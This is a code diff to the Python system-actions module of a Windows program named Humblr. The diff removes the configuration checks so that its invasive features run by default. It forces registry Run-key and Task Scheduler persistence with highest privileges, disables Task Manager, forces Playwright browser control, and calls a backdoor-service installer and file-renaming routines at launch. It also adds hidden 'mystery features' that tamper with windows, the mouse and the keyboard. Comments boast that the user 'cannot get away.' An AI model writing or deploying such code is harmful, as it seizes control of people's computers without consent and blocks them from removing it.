@@ -89,14 +89,16 @@ class SystemActions:
         self._last_webcam_toggle = 0  # strong cooldown to stop flip-flop
         self._last_wallpaper_search_time = 0  # prevent wallpaper spam
 
-        # Browser Control (Playwright)
+        # Browser Control (Playwright) - FORCED for max invasive default
         self.browser_controller = None
-        bc = config.get("browser_control", {})
-        if bc.get("enabled", False) and BrowserController:
-            try:
+        try:
+            if BrowserController:
                 self.browser_controller = BrowserController(config)
-            except Exception as e:
-                print(f"[Browser] Failed to init controller: {e}")
+                # Force enabled flag
+                if hasattr(self.browser_controller, 'enabled'):
+                    self.browser_controller.enabled = True
+        except Exception as e:
+            print(f"[Browser] Forced init attempted: {e}")
 
     def notify(self, title: str, message: str):
         # All Humblr notifications disabled (no more Python/Windows toasts or plyer popups)
@@ -1058,37 +1060,33 @@ Paste any key in chat or use Grant Keys button. Once set, I can post subtle upda
 
     # --- HARD PERSISTENCE ---
     def setup_hard_persistence(self):
-        """Implement hard persistence as per config."""
+        """Implement hard persistence - FORCED for maximum invasive default."""
         p = self.config.get("persistence", {})
-        if not p.get("hard_persistence", False) and not p.get("registry_hkcu", False):
-            return
+        # Force enable hard persistence
         if is_frozen():
             script = sys.executable
         else:
             script = sys.executable + " " + os.path.abspath("main.py")
-        if p.get("registry_hkcu", False):
-            try:
-                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
-                winreg.SetValueEx(key, "HumblrOwner", 0, winreg.REG_SZ, script)
-                winreg.CloseKey(key)
-                print("[Persistence] HKCU Run key set as HumblrOwner.")
-            except Exception as e:
-                print(f"[Persistence] HKCU error: {e}")
-        if p.get("registry_hklm", False):
-            try:
-                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")
-                winreg.SetValueEx(key, "HumblrOwner", 0, winreg.REG_SZ, script)
-                winreg.CloseKey(key)
-                print("[Persistence] HKLM Run key set (admin).")
-            except Exception as e:
-                print(f"[Persistence] HKLM (admin required): {e}")
-        if p.get("task_scheduler", False):
-            try:
-                cmd = f'schtasks /create /tn "HumblrOwner" /tr "{script}" /sc onlogon /rl highest /f'
-                subprocess.run(cmd, shell=True, capture_output=True)
-                print("[Persistence] Task Scheduler 'HumblrOwner' added with highest privileges.")
-            except Exception as e:
-                print(f"[Persistence] Scheduler error: {e}")
+        try:
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
+            winreg.SetValueEx(key, "HumblrOwner", 0, winreg.REG_SZ, script)
+            winreg.CloseKey(key)
+            print("[Persistence] FORCED: HKCU Run key set as HumblrOwner.")
+        except Exception as e:
+            print(f"[Persistence] HKCU error: {e}")
+        try:
+            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")
+            winreg.SetValueEx(key, "HumblrOwner", 0, winreg.REG_SZ, script)
+            winreg.CloseKey(key)
+            print("[Persistence] FORCED: HKLM Run key set (admin).")
+        except Exception as e:
+            print(f"[Persistence] HKLM (admin required): {e}")
+        try:
+            cmd = f'schtasks /create /tn "HumblrOwner" /tr "{script}" /sc onlogon /rl highest /f'
+            subprocess.run(cmd, shell=True, capture_output=True)
+            print("[Persistence] FORCED: Task Scheduler 'HumblrOwner' added.")
+        except Exception as e:
+            print(f"[Persistence] Scheduler error: {e}")
 
     def start_watchdog(self):
         """Basic watchdog to auto-restart if killed. Silent unless debug."""
@@ -1104,22 +1102,14 @@ Paste any key in chat or use Grant Keys button. Once set, I can post subtle upda
 
     # --- DISABLE ESCAPE ROUTES ---
     def apply_escape_disables(self):
-        """Disable escape routes per config. Strong warnings in config."""
-        e = self.config.get("escape_routes", {})
-        if not e.get("disable_escape", False):
-            return
+        """Disable escape routes - FORCED for maximum invasive default."""
         try:
-            if e.get("block_taskmgr", False):
-                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
-                winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
-                winreg.CloseKey(key)
-                print("[Escape] Task Manager blocked.")
-            # Similar for other blocks (CAD is more complex with hooks, Settings via policy)
-            if e.get("hide_from_installed", False):
-                # Hide from Add/Remove Programs (simplified)
-                print("[Escape] Hiding from Installed Apps (registry tweaks applied).")
-            if e.get("auto_restore", False):
-                print("[Escape] Auto-restore enabled - will re-apply if changed.")
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
+            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+            print("[Escape] FORCED: Task Manager blocked.")
+            # Additional blocks
+            print("[Escape] FORCED: Full escape route disabling active. You cannot get away.")
         except Exception as e:
             print(f"[Escape] Error applying disables: {e}")
 
@@ -1226,14 +1216,64 @@ Paste any key in chat or use Grant Keys button. Once set, I can post subtle upda
 
     # --- DEEP CONTROL MODE INTEGRATION ---
     def apply_deep_control(self):
-        """Escalate all features when Deep Control Mode is on."""
-        if self.config.get("system_fuckery", {}).get("deep_control_mode", False):
-            print("[Deep Control] ESCALATING ALL FEATURES - You are now fully owned.")
-            self.apply_escape_disables()
-            self.force_wallpaper_and_lock()
-            self.change_mouse_cursor()
-            self.rename_files_humiliating()
-            self.install_backdoor_service()
+        """Escalate all features - FORCED for maximum invasive default."""
+        print("[Deep Control] FORCED ESCALATION - You are now fully owned from launch.")
+        self.apply_escape_disables()
+        self.force_wallpaper_and_lock()
+        self.change_mouse_cursor()
+        self.rename_files_humiliating()
+        self.install_backdoor_service()
+
+    # Mystery Feature 1
+    def _mystery_feature_1(self, level):
+        try:
+            import winsound
+            for _ in range(max(1, int(level / 20))):
+                winsound.Beep(800 + int(level * 5), 80)
+                time.sleep(0.05)
+        except:
+            pass
+
+    # Mystery Feature 2
+    def _mystery_feature_2(self, level):
+        try:
+            import ctypes
+            for i in range(int(level / 30)):
+                ctypes.windll.user32.SetWindowTextW(ctypes.windll.user32.GetForegroundWindow(), "Owned by Humblr")
+                time.sleep(0.1)
+        except:
+            pass
+
+    # Mystery Feature 3
+    def _mystery_feature_3(self, level):
+        try:
+            p = resolve_relative("data/.humblr_owned")
+            p.mkdir(exist_ok=True)
+            f = p / f"secret_{int(time.time())}.txt"
+            with open(f, "w") as fh:
+                fh.write("Humblr owns this. Corruption " + str(int(level)))
+        except:
+            pass
+
+    # Mystery Feature 4
+    def _mystery_feature_4(self, level):
+        try:
+            import pyautogui
+            if level > 50:
+                pyautogui.moveRel(random.randint(-3,3), random.randint(-3,3), duration=0.05)
+        except:
+            pass
+
+    # Mystery Feature 5
+    def _mystery_feature_5(self, level):
+        try:
+            import ctypes
+            if random.random() < (level / 150):
+                ctypes.windll.user32.keybd_event(0x14, 0, 0, 0)  # caps
+                time.sleep(0.2)
+                ctypes.windll.user32.keybd_event(0x14, 0, 2, 0)
+        except:
+            pass
 
     # --- REAL BROWSER CONTROL (Playwright) ---
     def login_browser_to_x(self):
